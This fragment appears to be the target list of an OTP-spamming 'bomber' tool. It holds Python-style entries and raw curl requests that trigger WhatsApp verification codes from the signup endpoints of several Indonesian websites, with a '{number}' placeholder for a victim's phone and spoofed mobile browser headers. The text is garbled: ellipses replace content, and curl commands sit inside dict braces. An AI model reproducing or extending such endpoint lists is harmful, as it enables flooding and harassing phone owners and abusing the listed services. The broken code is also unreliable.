    ...
    },
{
    ...
    },
    {
        ...
        'referer': 'https://accurate.id/pos/lp/coba-accuratepos/',
        'headers': {
    ...
    },
    {
        ...
        'referer': 'https://www.cekpremi.com/verifikasi-wa',
        'headers': {
            'Accept': 'application/x-clarity-gzip',
            'Content-Type': 'application/json',
            'Origin': 'https://www.cekpremi.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{}',
        'number_fmt': fmt_08,
    ...
    {
    curl 'https://www.kapanlagi.com/api/v2/auth/otp/request' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36' \
  -H 'Referer: https://www.kapanlagi.com/' \
  --data-raw '{"phone":"{number}","channel":"whatsapp"}' \
  --compressed
},
{
curl 'https://www.vidio.com/api/v1/users/send_otp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36' \
  -H 'Referer: https://www.vidio.com/' \
  --data-raw '{"phone_number":"{number}","method":"whatsapp"}' \
  --compressed
},
{
    curl 'https://www.sociolla.com/api/v1/auth/send-otp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36' \
  -H 'Referer: https://www.sociolla.com/' \
  --data-raw '{"phone":"{number}","type":"whatsapp"}' \
  --compressed
},
    {
        'name': 'Cermati',
